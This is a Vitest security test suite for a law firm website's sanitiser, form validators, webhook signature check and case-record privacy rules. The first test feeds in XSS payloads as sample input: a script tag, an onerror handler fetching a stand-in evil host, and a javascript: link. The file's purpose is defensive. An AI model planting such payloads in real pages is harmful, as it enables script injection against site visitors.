import crypto from 'node:crypto'
import { describe, expect, it } from 'vitest'
import { cleanHtml, escapeHtml } from '../src/lib/security/sanitize'
import { verifyConstantTimeToken, verifyMetaSignature } from '../src/lib/security/signature'
import { InquiryBodySchema } from '../src/lib/validation/inquiry'
import { GuidedChatSchema } from '../src/lib/validation/chat'
import { isValidIndonesianWaNumber, waLink } from '../src/lib/whatsapp'
import {
  getPublishedArticleBySlug,
  getPublishedArticles,
  serializePublicCaseRecord,
} from '../src/lib/content'

describe('Security & Validation Unit Suite (SEC-004, SEC-005, SEC-006, SEC-008, SEC-011, SK-04, SK-05, SK-14)', () => {
  it('SEC-004: sanitizes XSS payloads in article HTML', () => {
    const dirty =
      '<p>Halo</p><script>alert(1)</script><img src="https://example.com/a.webp" onerror="fetch(\'https://evil.example\')" alt="Test"><a href="javascript:alert(1)">Klik</a>'
    const cleaned = cleanHtml(dirty)
    expect(cleaned).not.toContain('<script>')
    expect(cleaned).not.toContain('onerror')
    expect(cleaned).not.toContain('javascript:')
    expect(cleaned).toContain('<p>Halo</p>')
  })

  it('SEC-004: escapes HTML entities in plain text email fields', () => {
    expect(escapeHtml('<script>"test" & \'single\'</script>')).toBe(
      '&lt;script&gt;&quot;test&quot; &amp; &#39;single&#39;&lt;/script&gt;',
    )
  })

  it('SEC-005 & SEC-006: validates inquiry body strictly and rejects missing consent or extra fields', () => {
    const validPayload = {
      name: 'Budi Santoso',
      email: 'budi@perusahaan.co.id',
      phone: '+6281234567890',
      practiceAreaId: 'Litigasi Korporasi & Komersial',
      preferredDate: '2026-11-15',
      sessionSlot: 'pagi' as const,
      method: 'tatap-muka' as const,
      summary: 'Ingin menjadwalkan konsultasi terkait peninjauan kontrak kerja sama komersial.',
      consent: true as const,
      turnstileToken: 'valid-turnstile-token',
    }
    expect(InquiryBodySchema.safeParse(validPayload).success).toBe(true)

    // Missing consent -> fails
    expect(
      InquiryBodySchema.safeParse({ ...validPayload, consent: false }).success,
    ).toBe(false)

    // Unknown extra field -> fails (.strict())
    expect(
      InquiryBodySchema.safeParse({ ...validPayload, role: 'admin' }).success,
    ).toBe(false)

    // Non-empty honeypot -> fails
    expect(
      InquiryBodySchema.safeParse({ ...validPayload, website: 'http://spam.example' }).success,
    ).toBe(false)
  })

  it('SK-05: builds valid wa.me links and validates Indonesian E.164 phone numbers', () => {
    const link = waLink('+62 811-830-991', 'Halo FS dan Rekan, saya ingin konsultasi hukum.')
    expect(link).toBe(
      'https://wa.me/62811830991?text=Halo%20FS%20dan%20Rekan%2C%20saya%20ingin%20konsultasi%20hukum.',
    )
    expect(isValidIndonesianWaNumber('62811830991')).toBe(true)
    expect(isValidIndonesianWaNumber('0811830991')).toBe(false)
  })

  it('SEC-011: verifies Meta HMAC-SHA256 webhook signature with constant-time comparison', () => {
    const secret = 'test_meta_app_secret'
    const rawBody = '{"object":"whatsapp_business_account","entry":[]}'
    const validHmac =
      'sha256=' + crypto.createHmac('sha256', secret).update(rawBody, 'utf8').digest('hex')

    expect(verifyMetaSignature(rawBody, validHmac, secret)).toBe(true)
    expect(verifyMetaSignature(rawBody, 'sha256=deadbeef', secret)).toBe(false)
    expect(verifyMetaSignature(rawBody, null, secret)).toBe(false)
    expect(verifyConstantTimeToken('secret-123', 'secret-123')).toBe(true)
    expect(verifyConstantTimeToken('secret-123', 'wrong-123')).toBe(false)
  })

  it('SEC-008 & FR-5.3: never exposes draft articles in public article queries', () => {
    const published = getPublishedArticles()
    expect(published.every((a) => a.status === 'published')).toBe(true)
    expect(getPublishedArticleBySlug('draf-internal-belum-terbit')).toBeNull()
  })

  it('SK-14: strips clientName from public CaseRecord unless displayMode is named AND consentRef is present', () => {
    const unconsented = serializePublicCaseRecord({
      id: 'case-1',
      caseType: 'Tindak Pidana Korupsi',
      region: 'Semarang, Jawa Tengah',
      displayMode: 'named',
      clientName: 'PT Rahasia Internal',
      consentRef: null,
      displayOrder: 1,
      isPublished: true,
    })
    expect(unconsented.displayMode).toBe('anonymous')
    expect(unconsented.clientName).toBeUndefined()
  })

  it('SK-11 & SEC-005: strictly validates GuidedChatSchema and rejects missing consent or extra keys', () => {
    const validChat = {
      visitorName: 'Budi Santoso',
      visitorPhone: '+6281234567890',
      practiceArea: 'Hukum Korporasi & Bisnis',
      preferredSchedule: 'Senin, 10.00 WIB',
      notes: 'Konsultasi draf perjanjian komersial.',
      consent: true,
    }
    expect(GuidedChatSchema.safeParse(validChat).success).toBe(true)

    // Missing consent -> fails
    expect(GuidedChatSchema.safeParse({ ...validChat, consent: false }).success).toBe(false)

    // Short name -> fails
    expect(GuidedChatSchema.safeParse({ ...validChat, visitorName: 'A' }).success).toBe(false)

    // Invalid phone -> fails
    expect(GuidedChatSchema.safeParse({ ...validChat, visitorPhone: '123' }).success).toBe(false)

    // Extra unknown field -> fails (.strict())
    expect(GuidedChatSchema.safeParse({ ...validChat, isAdmin: true }).success).toBe(false)
  })
})
